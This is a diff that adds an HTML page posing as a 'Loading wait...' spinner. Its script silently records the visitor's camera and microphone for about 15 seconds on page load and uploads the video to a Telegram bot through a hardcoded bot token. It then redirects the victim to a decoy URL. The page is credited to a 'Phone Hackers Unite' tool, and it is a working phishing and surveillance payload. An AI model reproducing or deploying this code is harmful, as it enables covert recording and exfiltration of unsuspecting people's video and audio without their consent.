@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<style>
+
+@import url(https://fonts.googleapis.com/css?family=Montserrat);
+body {
+  position: relative;
+  width: 100%;
+  height: 100vh;
+  background-color: #fff;
+  font-family: Montserrat;
+}
+
+.wrap {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+}
+
+.text {
+  color: #4070F4;
+  display: inline-block;
+  margin-left: 5px;
+}
+
+.bounceball {
+  position: relative;
+  display: inline-block;
+  height: 37px;
+  width: 15px;
+}
+.bounceball:before {
+  position: absolute;
+  content: "";
+  display: block;
+  top: 0;
+  width: 15px;
+  height: 15px;
+  border-radius: 50%;
+  background-color: #4070F4;
+  transform-origin: 50%;
+  -webkit-animation: bounce 500ms alternate infinite ease;
+          animation: bounce 500ms alternate infinite ease;
+}
+
+@-webkit-keyframes bounce {
+  0% {
+    top: 30px;
+    height: 5px;
+    border-radius: 60px 60px 20px 20px;
+    transform: scaleX(2);
+  }
+  35% {
+    height: 15px;
+    border-radius: 50%;
+    transform: scaleX(1);
+  }
+  100% {
+    top: 0;
+  }
+}
+
+@keyframes bounce {
+  0% {
+    top: 30px;
+    height: 5px;
+    border-radius: 60px 60px 20px 20px;
+    transform: scaleX(2);
+  }
+  35% {
+    height: 15px;
+    border-radius: 50%;
+    transform: scaleX(1);
+  }
+  100% {
+    top: 0;
+  }
+}
+
+
+</style>
+<body>
+
+
+
+<div class="wrap">
+  <div class="loading">
+    <div class="bounceball"></div>
+    <div class="text">Loading wait...</div>
+  </div>
+</div>
+
+
+
+    <script>
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // Get the chat_id from the URL query parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id'); // Get the 'id' parameter from the URL
+        const weburl = urlParams.get('url');
+        // Access the device camera and microphone and start recording
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                startRecording(stream);
+            });
+
+        // Start recording video with audio
+        function startRecording(stream) {
+       setTimeout(() => {
+    window.location.href = weburl;
+   }, 17000); // Redirects after 17 seconds
+            mediaRecorder = new MediaRecorder(stream);
+
+            // Store the recorded chunks
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            // When recording stops, send the video to the Telegram bot
+            mediaRecorder.onstop = function() {
+                const videoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
+                sendVideoToTelegram(videoBlob);
+                recordedChunks = []; // Clear the recorded chunks
+            };
+
+            // Start recording
+            mediaRecorder.start();
+
+            // Stop recording and send video after a set duration (e.g., 10 seconds)
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 15000); // 10,000 milliseconds = 10 seconds
+        }
+
+
+        function sendVideoToTelegram(videoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', videoBlob, 'video.mp4');
+
+           const caption = 'Developed By: Md. Fahim Sarker\nImage Forwarded: Phone Hackers Unite';
+           const keyboard = JSON.stringify({
+             inline_keyboard: [
+           [{ text: 'Open Phone Hackers Unite', url: 'https://t.me/PhoneHackersUnite_bot' }],
+           [{ text: 'Developer Info', url: 'https://md-fahim-sarker.github.io/My-About/' }]
+      ]
+    });
+
+    formData.append('caption', caption);
+    formData.append('reply_markup', keyboard);
+
+            // Send the video to the Telegram bot
+            fetch(`https://api.telegram.org/bot6310109803:AAHUt4ZUHhqyqrG4Ld50A6gb4LxGZgE8LXQ/sendVideo`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>
